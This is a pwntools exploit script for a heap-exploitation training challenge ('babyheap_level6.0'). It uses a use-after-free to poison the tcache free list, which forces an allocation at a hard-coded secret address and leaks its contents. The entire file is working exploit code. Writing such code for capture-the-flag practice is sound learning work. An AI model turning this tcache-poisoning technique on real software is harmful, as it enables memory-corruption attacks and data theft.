from pwn import *

"""
Beware about the libc version, conceptual understanding changes per version;
What you might think is possible with your understanding in one version might not work in another;
"""

with process("/challenge/babyheap_level6.0") as p:
    p.sendline(b"malloc")
    p.sendline(b"0")
    p.sendline(b"16")

    p.sendline(b"malloc")
    p.sendline(b"1")
    p.sendline(b"16")

    p.sendline(b"free")
    p.sendline(b"1")

    p.sendline(b"free")
    p.sendline(b"0")

    p.sendline(b"scanf")
    p.sendline(b"0")
    p.sendline(p64(0x427569)) # secret addr

    p.sendline(b"malloc")
    p.sendline(b"2")
    p.sendline(b"16")

    p.sendline(b"malloc")
    p.sendline(b"3")
    p.sendline(b"16")

    p.sendline(b"puts")
    p.sendline(b"3")

    print(p.clean()) # get the secret
